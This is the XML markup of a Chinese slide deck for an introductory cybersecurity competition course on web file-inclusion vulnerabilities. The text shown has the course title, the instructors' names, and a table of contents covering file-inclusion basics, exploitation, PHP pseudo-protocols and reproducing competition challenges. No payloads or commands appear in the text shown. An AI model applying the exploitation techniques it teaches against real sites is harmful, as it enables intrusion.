          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669924" y="3456451"/>
            <a:ext cx="10850563" cy="869854"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b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结束语</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="文本占位符 62"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="17" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669924" y="4406734"/>
            <a:ext cx="10850563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zh-CN" altLang="en-US" sz="1200" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent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600" marR="0" lvl="0" indent="-228600" fontAlgn="auto">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>署名</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="文本占位符 62"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="18" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669924" y="4722368"/>
            <a:ext cx="10850563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zh-CN" altLang="en-US" sz="1200" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx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600" marR="0" lvl="0" indent="-228600" fontAlgn="auto">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>时间日期</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="6" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="5400000">
            <a:off x="10442716" y="202243"/>
            <a:ext cx="69568" cy="3429000"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="381000" cy="3429000"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="Rectangle 6"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="0"/>
              <a:ext cx="381000" cy="342900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/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="Rectangle 7"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="0"/>
              <a:ext cx="381000" cy="381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/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="12" name="Group 11"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="16200000">
            <a:off x="1679716" y="202243"/>
            <a:ext cx="69568" cy="3429000"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="381000" cy="3429000"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="16" name="Rectangle 15"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="0"/>
              <a:ext cx="381000" cy="3429000"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="002060"/>
            </a:solidFill>
            <a:ln>
              <a:solidFill>
                <a:srgbClr val="006C3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0" y="0"/>
              <a:ext cx="381000" cy="381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/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grp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0465" y="1123950"/>
            <a:ext cx="1553273" cy="1553273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8591" y="1140104"/>
            <a:ext cx="2157323" cy="1553273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0996" y="1077943"/>
            <a:ext cx="1677597" cy="1677597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E2C0D-3978-4D00-BE11-3FF38497FCC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F69DF-D574-4037-B6A5-58CCD724C69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defTabSz="914400">
              <a:defRPr lang="zh-CN" altLang="en-US" sz="3200" dirty="0"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单击此处编辑母版文本样式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单击此处编辑母版文本样式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单击此处编辑母版文本样式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单击此处编辑母版文本样式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b="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401732" y="6235700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9924" y="6235700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599" y="6235700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9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6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6.xml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6.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image27.png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29.png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tags" Target="../tags/tag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38.png"/></Relationships>
</file>

<file path=ppt/slides/_rels/slide2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6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image" Target="../media/image3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46.png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image45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6.xml"/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image" Target="../media/image47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6.xml"/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image" Target="../media/image50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53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13"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="2547319"/>
            <a:ext cx="12192000" cy="1491615"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="6000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="华光中圆_CNKI" panose="02000500000000000000" pitchFamily="2" charset="-122"/>
                <a:ea typeface="华光中圆_CNKI" panose="02000500000000000000" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>网络空间安全竞赛体验课</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US" sz="6000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="华光中圆_CNKI" panose="02000500000000000000" pitchFamily="2" charset="-122"/>
                <a:ea typeface="华光中圆_CNKI" panose="02000500000000000000" pitchFamily="2" charset="-122"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="6000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="华光中圆_CNKI" panose="02000500000000000000" pitchFamily="2" charset="-122"/>
                <a:ea typeface="华光中圆_CNKI" panose="02000500000000000000" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="6000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="华光中圆_CNKI" panose="02000500000000000000" pitchFamily="2" charset="-122"/>
                <a:ea typeface="华光中圆_CNKI" panose="02000500000000000000" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Web--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="6000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="75000"/>
                    <a:lumOff val="25000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="华光中圆_CNKI" panose="02000500000000000000" pitchFamily="2" charset="-122"/>
                <a:ea typeface="华光中圆_CNKI" panose="02000500000000000000" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>文件包含）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="5400" dirty="0">
              <a:latin typeface="华光中圆_CNKI" panose="02000500000000000000" pitchFamily="2" charset="-122"/>
              <a:ea typeface="华光中圆_CNKI" panose="02000500000000000000" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="文本占位符 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="673098" y="4578202"/>
            <a:ext cx="10845800" cy="17091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40000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="20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助教</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="20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:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="20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陈慧珍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="20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  任课</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="20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老师</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="20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:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="20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鲁辉、何</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="20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郁郁</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="20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/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId1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597" r="23486" b="18402"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-16277" y="2163"/>
            <a:ext cx="3637336" cy="6853673"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="3" name="直接连接符 2"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3632347" y="1123950"/>
            <a:ext cx="7953012" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="E82209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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="28" name="组合 27"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3636404" y="740007"/>
            <a:ext cx="2753457" cy="763743"/>
            <a:chOff x="3636404" y="740007"/>
            <a:chExt cx="2753457" cy="763743"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="002060"/>
          </a:solidFill>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="27" name="平行四边形 26"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3658981" y="1143710"/>
              <a:ext cx="2730880" cy="360040"/>
            </a:xfrm>
            <a:prstGeom prst="parallelogram">
              <a:avLst>
                <a:gd name="adj" fmla="val 76283"/>
              </a:avLst>
            </a:prstGeom>
            <a:grpFill/>
            <a:ln w="19050">
              <a:noFill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<a:no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20000"/>
                </a:lnSpc>
                <a:buClrTx/>
                <a:buSzTx/>
                <a:buFontTx/>
                <a:buNone/>
                <a:defRPr/>
              </a:pPr>
              <a:endPara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4" name="矩形 23"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3636404" y="740007"/>
              <a:ext cx="2459596" cy="756084"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:grpFill/>
            <a:ln w="19050">
              <a:solidFill>
                <a:srgbClr val="006C30"/>
              </a:solidFill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<a:no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20000"/>
                </a:lnSpc>
                <a:buClrTx/>
                <a:buSzTx/>
                <a:buFontTx/>
                <a:buNone/>
                <a:defRPr/>
              </a:pPr>
              <a:r>
                <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" sz="36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100000"/>
                    </a:prstClr>
                  </a:solidFill>
                  <a:effectLst/>
                  <a:uLnTx/>
                  <a:uFillTx/>
                  <a:latin typeface="方正正中黑简体" panose="02000000000000000000" pitchFamily="2" charset="-122"/>
                  <a:ea typeface="方正正中黑简体" panose="02000000000000000000" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:rPr>
                <a:t>目   录</a:t>
              </a:r>
              <a:endPara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方正正中黑简体" panose="02000000000000000000" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正正中黑简体" panose="02000000000000000000" pitchFamily="2" charset="-122"/>
                <a:cs typeface="+mn-ea"/>
                <a:sym typeface="+mn-lt"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="79" name="Group 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3878939" y="2385642"/>
            <a:ext cx="6456651" cy="564015"/>
            <a:chOff x="4267200" y="1600200"/>
            <a:chExt cx="6963691" cy="766396"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="80" name="TextBox 4"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5371429" y="1665097"/>
              <a:ext cx="5859462" cy="701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MY" sz="2800" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:rPr>
                <a:t>文件包含简述</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-MY" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="+mn-ea"/>
                <a:sym typeface="+mn-lt"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="81" name="Group 5"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="4267200" y="1600200"/>
              <a:ext cx="864870" cy="739140"/>
              <a:chOff x="4267199" y="1268631"/>
              <a:chExt cx="1373976" cy="1174236"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="82" name="Rectangle 6"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4343867" y="1345299"/>
                <a:ext cx="1297308" cy="1097568"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="002060"/>
              </a:solidFill>
              <a:ln w="5715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3200" b="1" dirty="0">
                    <a:cs typeface="+mn-ea"/>
                    <a:sym typeface="+mn-lt"/>
                  </a:rPr>
                  <a:t>1</a:t>
                </a:r>
                <a:endParaRPr lang="en-MY" sz="3200" b="1" dirty="0">
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="83" name="Right Triangle 7"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm rot="5400000">
                <a:off x="4267199" y="1268631"/>
                <a:ext cx="455895" cy="455895"/>
              </a:xfrm>
              <a:prstGeom prst="rtTriangle">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent2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en-MY"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84" name="Group 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3878934" y="3373252"/>
            <a:ext cx="3157432" cy="564015"/>
            <a:chOff x="4267200" y="1600200"/>
            <a:chExt cx="3405388" cy="766396"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="85" name="TextBox 4"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5371434" y="1665097"/>
              <a:ext cx="2301154" cy="701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+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:rPr>
                <a:t>文件包含利用</a:t>
              </a:r>
              <a:endPara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  <a:sym typeface="+mn-lt"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="86" name="Group 5"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="4267200" y="1600200"/>
              <a:ext cx="864870" cy="739140"/>
              <a:chOff x="4267199" y="1268631"/>
              <a:chExt cx="1373976" cy="1174236"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="87" name="Rectangle 6"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4343867" y="1345299"/>
                <a:ext cx="1297308" cy="1097568"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="002060"/>
              </a:solidFill>
              <a:ln w="5715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3200" b="1" dirty="0">
                    <a:cs typeface="+mn-ea"/>
                    <a:sym typeface="+mn-lt"/>
                  </a:rPr>
                  <a:t>2</a:t>
                </a:r>
                <a:endParaRPr lang="en-MY" sz="3200" b="1" dirty="0">
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="88" name="Right Triangle 7"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm rot="5400000">
                <a:off x="4267199" y="1268631"/>
                <a:ext cx="455895" cy="455895"/>
              </a:xfrm>
              <a:prstGeom prst="rtTriangle">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent2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en-MY"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89" name="Group 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3878940" y="4350333"/>
            <a:ext cx="2764359" cy="564015"/>
            <a:chOff x="4267200" y="1600200"/>
            <a:chExt cx="2981442" cy="766396"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="90" name="TextBox 4"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5371424" y="1665097"/>
              <a:ext cx="1877218" cy="701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+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:rPr>
                <a:t>php</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US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+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:rPr>
                <a:t>伪协议</a:t>
              </a:r>
              <a:endPara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  <a:sym typeface="+mn-lt"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="91" name="Group 5"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="4267200" y="1600200"/>
              <a:ext cx="864870" cy="739140"/>
              <a:chOff x="4267199" y="1268631"/>
              <a:chExt cx="1373976" cy="1174236"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="92" name="Rectangle 6"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4343867" y="1345299"/>
                <a:ext cx="1297308" cy="1097568"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="002060"/>
              </a:solidFill>
              <a:ln w="5715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3200" b="1" dirty="0">
                    <a:cs typeface="+mn-ea"/>
                    <a:sym typeface="+mn-lt"/>
                  </a:rPr>
                  <a:t>3</a:t>
                </a:r>
                <a:endParaRPr lang="en-MY" sz="3200" b="1" dirty="0">
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="93" name="Right Triangle 7"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm rot="5400000">
                <a:off x="4267199" y="1268631"/>
                <a:ext cx="455895" cy="455895"/>
              </a:xfrm>
              <a:prstGeom prst="rtTriangle">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent2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en-MY"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94" name="Group 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3878938" y="5304091"/>
            <a:ext cx="4020393" cy="564015"/>
            <a:chOff x="4267200" y="1600200"/>
            <a:chExt cx="4336115" cy="766396"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="95" name="TextBox 4"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5371430" y="1665097"/>
              <a:ext cx="3231885" cy="701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MY" sz="2800" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:rPr>
                <a:t>平台</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:rPr>
                <a:t>/</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-MY" sz="2800" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:rPr>
                <a:t>相关赛题复现</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-MY" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="+mn-ea"/>
                <a:sym typeface="+mn-lt"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="96" name="Group 5"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="4267200" y="1600200"/>
              <a:ext cx="864870" cy="739140"/>
              <a:chOff x="4267199" y="1268631"/>
              <a:chExt cx="1373976" cy="1174236"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="97" name="Rectangle 6"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4343867" y="1345299"/>
                <a:ext cx="1297308" cy="1097568"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="002060"/>
              </a:solidFill>
              <a:ln w="5715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3200" b="1" dirty="0">
                    <a:cs typeface="+mn-ea"/>
                    <a:sym typeface="+mn-lt"/>
                  </a:rPr>
                  <a:t>4</a:t>
                </a:r>
                <a:endParaRPr lang="en-MY" sz="3200" b="1" dirty="0">
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98" name="Right Triangle 7"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm rot="5400000">
                <a:off x="4267199" y="1268631"/>
                <a:ext cx="455895" cy="455895"/>
              </a:xfrm>
              <a:prstGeom prst="rtTriangle">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent2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en-MY">
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt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roup 3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1494511" y="2689807"/>
            <a:ext cx="7745741" cy="3600714"/>
            <a:chOff x="4267199" y="1600200"/>
            <a:chExt cx="3514051" cy="4892734"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="80" name="TextBox 4"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5371205" y="1664914"/>
              <a:ext cx="2410045" cy="482802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MY" sz="6600" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:rPr>
                <a:t>文件包含简述</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-MY" sz="6600" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="+mn-ea"/>
                <a:sym typeface="+mn-lt"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="81" name="Group 5"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="4267199" y="1600200"/>
              <a:ext cx="1006789" cy="1164209"/>
              <a:chOff x="4267199" y="1268631"/>
              <a:chExt cx="1599436" cy="1849522"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="82" name="Rectangle 6"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4569327" y="2020585"/>
                <a:ext cx="1297308" cy="1097568"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="002060"/>
              </a:solidFill>
              <a:ln w="5715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3200" b="1" dirty="0">
                    <a:cs typeface="+mn-ea"/>
                    <a:sym typeface="+mn-lt"/>
                  </a:rPr>
                  <a:t>1</a:t>
                </a:r>
                <a:endParaRPr lang="en-MY" sz="3200" b="1" dirty="0">
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="83" name="Right Triangle 7"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm rot="5400000">
                <a:off x="4267199" y="1268631"/>
                <a:ext cx="455895" cy="455895"/>
              </a:xfrm>
              <a:prstGeom prst="rtTriangle">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent2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en-MY">
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt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 txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="547687" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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 dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>1.1</a:t>
            </a:r>
            <a:r>
